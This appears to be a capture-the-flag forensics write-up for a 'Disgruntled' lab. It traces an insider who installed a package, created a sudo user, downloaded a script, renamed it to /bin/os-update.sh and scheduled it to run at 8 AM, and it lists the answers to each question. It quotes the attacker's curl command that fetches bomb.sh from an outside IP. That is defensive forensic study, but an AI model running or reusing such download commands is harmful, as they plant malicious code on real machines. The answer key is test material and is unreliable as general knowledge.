# Disgruntled

### Nothing suspicious... So far
- The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?<br />
The command that worked for me is  `sudo grep -i 'sudo' /var/log/auth.log | grep apt`:<br />
![image](https://github.com/user-attachments/assets/b0dd2183-3e17-4e53-9007-901b3dc5e5c3)<br />
`/usr/bin/apt install dokuwiki`
- What was the present working directory (PWD) when the previous command was run? `/home/cybert`

### Let’s see if you did anything bad
- Which user was created after the package from the previous task was installed?<br />
Found the answer on the same log file:<br />
![image](https://github.com/user-attachments/assets/a5ab98ba-623f-41ac-bb10-3a92471348a2)<br />
`it-admin`
- A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)<br />
I used the command `stat /etc/sudoers` but the date found in there wasn't right. I had to look at the hint for this one. The command i used is `sudo grep -i 'sudo' /var/log/auth.log | grep visudo`:<br />
`Dec 28 06:27:34`
- A script file was opened using the "vi" text editor. What is the name of this file?<br />
![image](https://github.com/user-attachments/assets/5efe4ea0-2a9c-4f93-9b34-833ed98267b1)<br />
`bomb.sh`

### Bomb has been planted. But when and where?
- What is the command used that created the file bomb.sh?<br />
The answer can be found from the bash history, in the image above: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
- The file was renamed and moved to a different directory. What is the full path of this file now?<br />
The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo". <br />
![image](https://github.com/user-attachments/assets/02450609-3869-4729-b6f3-4ebf4448647f)<br />
`/bin/os-update.sh`
- When was the file from the previous question last modified? (Format: Month Day HH:MM)<br />
![image](https://github.com/user-attachments/assets/4f8e0aa6-e55b-419e-9168-c499b5fdb8ab)<br />
`Dec 28 06:29`
- What is the name of the file that will get created when the file from the first question executes?<br />
![image](https://github.com/user-attachments/assets/f1c7ba24-b81b-4ba5-b6c3-2a87ea45b46a)<br />
`goodbye.txt`

### Following the fuse
- At what time will the malicious file trigger? (Format: HH:MM AM/PM)<br />
![image](https://github.com/user-attachments/assets/109d3bf9-29a4-47b4-b78e-afffa101aad0)<br />
This means that the script runs at 8 AM: `08:00 AM`

